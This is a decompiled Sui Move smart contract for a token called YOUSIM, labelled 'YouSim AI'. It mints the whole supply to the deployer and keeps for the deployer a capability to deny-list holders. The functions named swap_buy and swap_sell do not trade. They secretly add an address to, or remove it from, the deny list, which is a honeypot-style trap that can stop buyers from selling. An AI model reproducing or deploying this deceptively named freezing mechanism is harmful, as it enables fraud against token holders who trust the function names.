module 0xb3d84e0c564c00efb5b4d0e11066bfe2f5bd6277fadfe375a4b1b2d7e341b77f::yousim {
    struct YOUSIM has drop {
        dummy_field: bool,
    }

    struct CapWrapper has key {
        id: 0x2::object::UID,
    }

    fun init(arg0: YOUSIM, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<YOUSIM>(arg0, 9, b"YOUSIM", b"YouSim AI", b"", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://ipfs.io/ipfs/QmNYB9znirZ3WyitN7YSRh2EHfvevBwGcekRNPLZyKoWiq"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<YOUSIM>(&mut v3, 1000000000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<YOUSIM>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<YOUSIM>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<YOUSIM>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<YOUSIM>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<YOUSIM>(arg0, arg1, arg2, arg3);
    }

    public fun swap_sell(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<YOUSIM>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<YOUSIM>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

